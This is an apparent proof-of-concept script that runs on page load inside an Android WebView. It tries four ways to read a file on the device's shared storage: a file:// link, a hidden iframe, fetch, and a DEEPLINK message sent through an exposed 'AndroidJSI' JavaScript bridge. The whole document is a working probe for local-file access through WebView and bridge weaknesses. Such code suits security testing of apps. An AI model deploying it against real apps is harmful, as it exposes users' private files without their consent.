<script>
// Try multiple methods to access the file
function readFile() {
    // Method 1: Direct navigation
    const link = document.createElement('a');
    link.href = 'file:///sdcard/Download/WTF.txt';
    link.target = '_blank';
    link.click();
    
    // Method 2: Iframe loading
    const iframe = document.createElement('iframe');
    iframe.src = 'file:///sdcard/Download/WTF.txt';
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    
    // Method 3: Try fetch (will likely fail but worth trying)
    fetch('file:///sdcard/Download/WTF.txt')
        .then(response => response.text())
        .then(data => alert('Fetch worked: ' + data))
        .catch(e => console.log('Fetch failed as expected: ' + e));
    
    // Method 4: Use JavaScript interface
    if (typeof AndroidJSI !== 'undefined') {
        AndroidJSI.onReceiveMessage(JSON.stringify({
            action: "DEEPLINK",
            data: { deeplinkUrl: "file:///sdcard/Download/WTF.txt" }
        }));
    }
}

readFile();
</script>
